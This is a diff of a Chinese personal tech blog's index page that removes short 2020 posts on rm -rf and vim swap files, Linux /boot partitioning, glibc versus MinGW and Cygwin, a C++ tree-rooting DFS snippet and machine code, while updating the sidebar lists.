-<p>rm就可以了，不过要加两个参数-rf 即：rm -rf 目录名字</p>
-<p>-r 就是向下递归，不管有多少级目录，一并删除（只删除一个文件不用 -r）</p>
-<p> -f 就是直接强行删除，不作任何提示的意思 </p>
-<p>如果你不想vim产生交换文件，可以使用如下命令禁止</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:set noswapfile</span><br></pre></td></tr></table></figure>
-
-<p>也可以使用以下命令，设置生成交换文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:set swapfile</span><br></pre></td></tr></table></figure>
-
-<p>注意，以上设置仅针对当前文件生效。</p>
-<p>注：.swp文件是个隐藏文件，一般的 ls -l 命令是查看不到的，所以要用 ll -a 命令查看</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/07/06/vim/" data-id="ckcrh5pcs00047seldhp5a0j0" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-linux" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/05/linux/" class="article-date">
-  <time datetime="2020-07-05T05:50:45.000Z" itemprop="datePublished">2020-07-05</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/05/linux/">多用户多任务操作系统</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p> Linux是一个真实的、完整的多用户多任务操作系统，多用户多任务就是可以在系统上建立多个用户，而多个用户可以在同一时间内登录同一个系统执行各自不同的任务，而互不影响 </p>
-<p> 个人计算机操作系统早期一般都是单用户操作系统，其主要特点是在某一时间为单个用户服务。早期的DOS操作系统是单用户单任务操作系统，Windows XP则是单用户多任务操作系统。现在常用的Windows操作系统都是多用户、多任务的操作系统，使用最广泛的win7，win10都是多用户，多任务操作系统。 </p>
-<p> /boot 这是个目录， 可以分成一个分区，然后挂载到/boot目录， 也可以只用一个/分区， 里面会有boot目录的，保存的是引导文件，内核等</p>
-<p>/boot分区就是操作系统的内核及在引导过程中使用的文件，一般是几年前的版本要求划分的一个区，大小为100MB左右，但现在的新版本都不需要对这个分区进行单独划分，也就是说你完全可以不分/boot。<br>安装Linux只要求两个基本分区，即根分区及交换分区，如果你的磁盘空间足够大，可以多划分空间给根分区，你也可以把常用的目录新建到桌面，如下载的软件包，放到桌面不影响你进入Linux系统的速度，当然这要求你有足够大的根分区。</p>
-<p> 曾经给/boot一个很小的分区是有十分充足的理由的，因为在二十几年前，BIOS只能认一个1024柱面的硬盘，如果启动文件放在0-1023（从0开始数，共1024个柱面）之外，BIOS就无法读取启动所需的文件，从而无法启动。为了兼容这种BIOS，就需要在磁盘前端分出一个小分区专门来存储启动文件。<br>但是现在，应该是找不到那么古老的主板了，即使能找到，也无法安装现在的linux了。<br>100MB的boot分区，有什么害处呢？<br>太小了，放不下现在启动所需的文件了。现在的linux，留下两个内核是很正常的，如果新内核有什么问题，还可以用老内核。这台机器上现在有两个版本的linux内核（3.13.0-85 和 4.4.0.21），一共多大呢？<br>代码:<br>ls -al –block-size=M /boot<br>total 98M<br>看上去两个内核100MB勉强够用，但是现在的启动文件是越来越大的，例如3.13的initrd是29M，但4.4的initrd有35M，下一次升级内核，100MB就不够用了。<br>另外在Debian系的Linux发行版上，还有另一个问题，老旧的内核不会被自动清除。上次手动清理冗余内核的时候，/boot已经达到了700+MB。/boot分区满了，内核就无法安装，引发问题。<br>所以，不要划分/boot分区。 </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/07/05/linux/" data-id="ckcrh5pcq00037selcbj74esz" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-glibc" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/03/glibc/" class="article-date">
-  <time datetime="2020-07-03T11:08:51.000Z" itemprop="datePublished">2020-07-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/03/glibc/">glibc</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="c语言库函数和编译器"><a href="#c语言库函数和编译器" class="headerlink" title="c语言库函数和编译器"></a>c语言库函数和编译器</h1><p>C标准库，顾名思义既然是标准，就是由标准组织制定的。是由“美国国家标准协会（American National Standards Institute,ANSI）”为了规范C语言库而制定的标准。在最初，各个大学各个公司使用的C语言库都不尽相同，造成相互移植非常困难，在这个背景下，制定了这个标准。</p>
-<p>C运行库，是和平台相关的，即和操作系统相关的。它由不同操作系统不同开发平台提供不同的C运行库。但是C运行库的部分实现是基于C标准库的，即C运行库是各个操作系统各个开发工具根据自身平台开发的库，某种程度上，可以说C运行库是C标准库的一个扩展库，只是加了很多C标准库所没有的与平台相关的或者不相关的库接口函数。举例子如：c标准库的strcpy函数负责字符串的拷贝，但是由于缺少对目地字符串缓冲区大小的控制，极有可能导致缓冲区溢出（大量的缓冲区溢出攻击都是由于这种漏洞而产生的）；相反，Windows提供了能够实现同样功能的安全的字符串拷贝函数，减少了缓冲区攻击的可能，strcpy_s。这些函数是以c运行库的方式提供的，当然，不同的操作系统，c运行时库可能不同，但是对c标准库的支持是完全一致的，也就是说，在不同的操作系统上，使用同一个c标准库的函数必然产生一致的结果。</p>
-<p>任何一个C程序要想要得到实现，都离不开背后的一套庞大的代码来进行支持（至少包括入口函数，以及其所依赖的函数所构成的函数集合等），这样一套背后代码被称为运行库，C语言的运行库叫做CRT（Runtime Library）。</p>
-<p>C语言的运行库某种程度上就是C语言的程序和不同操作系统平台之间的抽象层。它将不同的操作系统API抽象成相同的库函数（银弹理论的又一次胜利）。比如可以在不同OS上使用fread来读取文件，而事实上，fread在不同的操作系统平台下的实现是不同的，但作为运行库的使用者我们不需要关心这一点。<br>虽然各个平台下的C语言运行库提供了很多功能，但很多时候它们毕竟有限，比如用户的权限控制、操作系统线程创建等都不是属于标准的C语言运行库，于是我们不得不通过其他的办法，诸如绕过C语言运行直接调用操作系统API或使用其他的库。</p>
-<p>值得注意的是，像线程操作这样的功能并不是标准的C语言运行库的一部分，但是glibc和MSVCRT都包含了线程操作的库函数。比如glibc有一个可选的pthread库中pthread_create()函数可以用来创建线程；而MSVCRT中可以使用_beginthread()函数来创建线程。所以glibc和MSVCRT都是标准C语言运行库的超集，它们各自对C标准库进行了一些扩展。</p>
-<p>总结一下，C标准库就是任何平台都可以使用的基本C语言库。而CRT除了将C标准库加入所属范围外，还扩展了与平台相关的接口库，这些接口实现根据不同平台调用不同平台的操作系统API。</p>
-<p>如下图所示，采用C标准库编写的程序可以应用到windows平台，也可以应用到linux平台；而用CRT另外与平台相关的库函数编写的应用程序不能跨平台运行。</p>
-<p> <a href="https://blog.csdn.net/qq_21950929/article/details/79754552" target="_blank" rel="noopener">https://blog.csdn.net/qq_21950929/article/details/79754552</a> </p>
-<p>  glibc是gnu发布的c运行库。glibc是linux 系统中最底层的api（应用程序开发接口），几乎其它任何的运行库都会倚赖于glibc。 </p>
-<p>msvc crt则是windows</p>
-<p>C语言编译器</p>
-<p>  1.MSVC是指微软的VC编译器 </p>
-<p>2.gcc系列</p>
-<p>MinGW项目<code>（[官方网站](http://www.mingw.org/)）是</code>Minimalist GNU for Windows`的缩写，是<strong>本地Windows应用程序的极简主义开发环境</strong>，该项目旨在<strong>将gcc编译器移植到Windows系统上</strong> 。</p>
-<p> cygwin/gcc和MinGW都是gcc在windows下的编译环境</p>
-<p>cygwin/gcc完全可以和在linux下的gcc化做等号，这个可以从boost库的划分中可以看出来端倪，cygwin下的gcc和linux下的gcc完全使用的是相同的Toolsets。</p>
-<p>所以完全可以和linux一起同步更新gcc版本，而不用担心问题，并且在cygwin/gcc做的东西（不用win32的）可以无缝的用在linux下，没有任何问题。是在windows下开发linux程序的一个很好的选择。</p>
-<p>但是 <strong>在cygwin/gcc下编译出来的程序，在windows执行必须依赖cygwin1.dll，并且速度有些慢，</strong> 如果不想依赖这个东西的化，必须在gcc的编译选项中加入-mno-cygwin。加入这个选项其实gcc编译器就会自动的选择在安装cygwin/gcc时安上的mingw,这个mingw就是gcc的一个交叉编译。</p>
-<p>对于mingw作为gcc在windows上的一个实现，不像cygwin的gcc在一个模拟linux上运行，同时相当一部分linux的工具不能够使用。</p>
-<p>根据以上的分析，如果在windows开发linux程序，cygwin是很好的选择。如果你开发的程序不介意有一个cygwin1.dll的话，也是可以选择cygwin的。如果你是想开发windows下的程序，还要必须用gcc的化，mingw是很好的一个选择 </p>
-<p>MinGW与Cygwin:原理与比较**</p>
-<p>首先 MinGW 和 Cygwin 都可以用来跨平台开发。</p>
-<p>MinGW 是 Minimalistic GNU for Windows 的缩写，也就是 Win 版的 GCC。</p>
-<p>Cygwin 则是全面模拟了Linux的接口，提供给运行在它上面的的程序使用，并提供了大量现成的软件，更像是一个平台。</p>
-<p>相对的 MingW 也有一个叫 MSys（Minimal SYStem）的子项目，主要是提供了一个模拟 Linux 的 Shell 和一些基本的 Linux 工具。因为编译一个大型程序，光靠一个 GCC 是不够的，还需要有 Autoconf 等工具来配置项目，所以一般在 Windows 下编译 ffmpeg 等 Linux 下的大型项目都是通过Msys 来完成的，当然 Msys 只是一个辅助环境，根本的工作还是 MingW 来做的。</p>
-<p>基本原理<br>修改编译器，让 Window 下的编译器把诸如 fork 的调用翻译成等价的形式，这就是 MingW 的做法.<br>修改库，让 Window 提供一个类似 UNIX 提供的库，他们对程序的接口如同 UNIX 一样，而这些库，当然是由 win32 的 API 实现的，这就是 Cygwin 的做法.<br>用 MingW 和 Cygwin 编译出来的程序的区别<br>首先 MingW 和 Cygwin 都不能让 Linux 下的程序直接运行在 Windows 上，必需通过源代码重新编译。</p>
-<p>现代操作系统包括 Windows 和 Linux 的基本设计概念像进程线程地址空间虚拟内存这些都是大同小异的，之所以二者上的程序不能兼容，主要是它们对这些功能具体实现上的差异，首先是可执行文件的格式，Window 使用 PE 的格式，并且要求以 .EXE 为后缀名。Linux 则使用 Elf。其次操作系统的 API 也不一样，如 Windows 用 CreateProcess() 创建进程，而 Linux 使用 fork()。</p>
-<p>所以要移植程序必然要在这些地方进行改变，MingW 有专门的 W32api 头文件，来把代码中 Linux 方式的系统调用替换为对应的 Windows 方式。而 Cygwin 则通过 cygwin1.dll 这个文件来实现这种 API 的转换，并模拟一个 Linux 系统调用接口给程序，程序依然以 Linux 的方式调用系统 API，只不过这个 API 在 cygwin1.dll 上，cygwin1.dll 再调用 Windows 对应的实现，来把结果返回给程序。<br>二者生成的程序都是能在 Windows 上运行的 EXE 文件，显然都是 PE 格式，用一个PE格式查看工具检查一下就能发现，Cygwin 生成的程序依然有 fork() 这样的 Linux 系统调用，但目标库是 cygwin1。而 MingW 生成的程序，则全部使用从 KERNEL32 导出的标准 Windows 系统 API。</p>
-<p>这样看来用 MingW 编译的程序性能会高一点，而且也不用带着那个接近两兆的 cygwin1.dll 文件。</p>
-<p>但 Cygwin 对 Linux 的模拟比较完整，甚至有一个 Cygwin X 的项目，可以直接用 Cygwin 跑 X。</p>
-<p>另外 Cygwin 可以设置 -mno-cygwin 的 flag，来使用 MingW 编译。</p>
-<p>而与 Cygwin 更有可比性的 MSys 上的工具也是通过 Cygwin 这种模拟的方式来提供的。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/07/03/glibc/" data-id="ckc6b406i0001wwelavgj02n0" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-图" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/03/%E5%9B%BE/" class="article-date">
-  <time datetime="2020-07-03T01:37:47.000Z" itemprop="datePublished">2020-07-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/03/%E5%9B%BE/">图</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>一.无根图转化为有根图</p>
-<p>#include <iostream><br>#include <vector></p>
-<p>using namespace std;</p>
-<p>#define MAX 1000001</p>
-<p>vector<int> G[MAX];<br>int P[MAX];</p>
-<p>void inputTree(int n)<br>{<br>    int u, v; //存放两个节点编号</p>
-<pre><code>//输入边信息
-for (int i = 0; i &lt; n-1; ++i)
-{
-    cin &gt;&gt; u &gt;&gt; v;
-    G[u].push_back(v);
-    G[v].push_back(u);
-}</code></pre><p>}</p>
-<p>//u为当前节点,fa为它的父节点<br>void dfs(int u, int fa)<br>{a<br>    int d = G[u].size();</p>
-<pre><code>for (int i = 0; i &lt; d; ++i)
-{
-    int v = G[u][i];
-
-    if (v != fa)
-        dfs(v, P[v] = u);
-}</code></pre><p>}</p>
-<p>int main()<br>{<br>    int n; //节点数<br>    int root; //根节点编号<br>    cin &gt;&gt; n;<br>    inputTree(n);</p>
-<pre><code>cin &gt;&gt; root;
-P[root] = -1;
-dfs(root, P[root]);
-
-//输出
-for (int i = 0; i &lt; n; ++i)
-{
-    cout &lt;&lt; &quot;R[&quot; &lt;&lt; i &lt;&lt; &quot;] : &quot; &lt;&lt; P[i] &lt;&lt; endl;
-}
-
-return 0;</code></pre><p>}</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/07/03/%E5%9B%BE/" data-id="ckc6b406l0002wwelc4vqanej" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-机器码" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/06/28/%E6%9C%BA%E5%99%A8%E7%A0%81/" class="article-date">
-  <time datetime="2020-06-28T12:00:30.000Z" itemprop="datePublished">2020-06-28</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/28/%E6%9C%BA%E5%99%A8%E7%A0%81/">机器码</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>编译器是想滚雪球一样滚出来的，一开始用机器语言写一个很功能有限的汇编器（汇编接近机器语言，几乎就是简单的替换，比较好写），然后用它编译更强大的汇编器/编译器。更高级的语言由稍微低级点的语言编写，然后发展到合适的程度之后，某些语言实现了自举，即自己编译自己的编译器。</p>
-<p>编译的结果是二进制文件，二进制文件其实是和系统关系并没有那么大，只是一个内存的镜像。具体的Windows或者Linux之间不同的只是封装格式PE/EFI的区别，这些信息只是用来告诉系统该怎么加载这个镜像而已，自己写一个操作系统来加载RAW内存镜像，这样的程序也是可以运行的。如果一个程序没有用系统提供的API，能够直接访问硬件中断的话就和系统无关了。不过现在的系统都有保护，不允许直接调用硬件中断，都是调用系统的API，系统再调用硬件，来执行。</p>
-<p>作者：xuzhenglun<br>链接：<a href="https://segmentfault.com/q/1010000004105427#answer-1020000004106569" target="_blank" rel="noopener">https://segmentfault.com/q/1010000004105427#answer-1020000004106569</a><br>来源：SegmentFault 思否<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
-<p> 语言和系统都是运行在CPU上的，不是语言运行在系统里。系统应该被看成类库和框架。 </p>
-<p>编程语言是一种可执行程序的表达方式，编译器把编程语言的表达方式转换为可执行的程序，而编译器做转换的过程，可以操作系统相关(也就是转换出的程序运行在特定操作系统上)，也可以操作系统无关(直接在裸机运行)。而操作系统，本身是一个程序，也可以是编程语言来表达的(编译后通常操作系统无关)，也可以不是(直接写机器码)，而操作系统这个特殊的程序，提供了库，硬件驱动，运行时环境，框架等，是为了让运行在其上的程序写得更容易</p>
-<p>不同cpu识别的机器码不同</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/06/28/%E6%9C%BA%E5%99%A8%E7%A0%81/" data-id="ckc6b40700003wwelcxk34ixy" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
   </nav>
 
 </section>
@@ -760,7 +859,7 @@ return 0;</code></pre><p>}</p>
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li></ul>
     </div>
   </div>
 
@@ -773,23 +872,23 @@ return 0;</code></pre><p>}</p>
       <ul>
         
           <li>
-            <a href="/2020/07/10/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/">python虚拟环境</a>
+            <a href="/2020/09/26/C-std/">C++ std</a>
           </li>
         
           <li>
-            <a href="/2020/07/10/gcc%E5%92%8Cmake/">gcc和make</a>
+            <a href="/2020/08/19/ida-pro/">ida pro</a>
           </li>
         
           <li>
-            <a href="/2020/07/10/csdn%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/">csdn缓存问题</a>
+            <a href="/2020/08/07/ssti/">ssti</a>
           </li>
         
           <li>
-            <a href="/2020/07/08/git/">Git远程操作</a>
+            <a href="/2020/08/07/google-hack/">google hack</a>
           </li>
         
           <li>
-            <a href="/2020/07/07/linux-1/">linux</a>
+            <a href="/2020/08/06/cors/">cors</a>
           </li>
         
       </ul>
